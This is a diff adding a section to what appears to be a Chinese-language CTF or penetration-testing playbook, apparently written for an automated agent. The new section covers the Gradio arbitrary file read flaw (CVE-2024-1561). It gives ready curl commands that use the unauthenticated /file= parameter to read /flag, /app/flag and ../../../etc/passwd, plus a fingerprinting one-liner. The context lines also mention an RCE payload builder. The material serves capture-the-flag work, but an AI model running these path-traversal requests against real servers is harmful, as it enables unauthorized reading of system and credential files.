@@ -175,3 +175,24 @@ done
 - **不要只看默认端口**——同主机可能运行多个服务。对发现的每个端口独立做协议/产品指纹，再选择与证据匹配的 CVE；端口号本身不是漏洞判据。
 - scanner.py 的 `build_rce_payload()` 默认 payload 在新版 Dify 上可能返回 500
 - 如果 10 轮内 React2Shell 无进展，立即切换到端口扫描同主机其他服务
+
+### 6.7 Gradio 任意文件读取（CVE-2024-1561）
+
+**场景**：Gradio 应用（端口通常 7860），HTML 含 `gr-`/`gradio-container`。
+
+**核心**：`/file=` 参数未做路径限制，可读取服务器任意文件。
+
+```bash
+# 直接读 flag（先试常见路径）
+curl -s 'http://TARGET:7860/file=/flag'
+curl -s 'http://TARGET:7860/file=/app/flag'
+curl -s 'http://TARGET:7860/file=../../../etc/passwd'
+
+# 若目标以 HTTP 80 端口暴露（反代到内部 7860）
+curl -s 'http://TARGET/file=/flag'
+
+# 指纹确认
+curl -s http://TARGET:7860/ | grep -oE 'gr-|gradio-container|/queue/'
+```
+
+**关键**：`/file=` 本身就是遍历入口，不需要登录；优先直读 `/flag`，读不到再枚举路径。
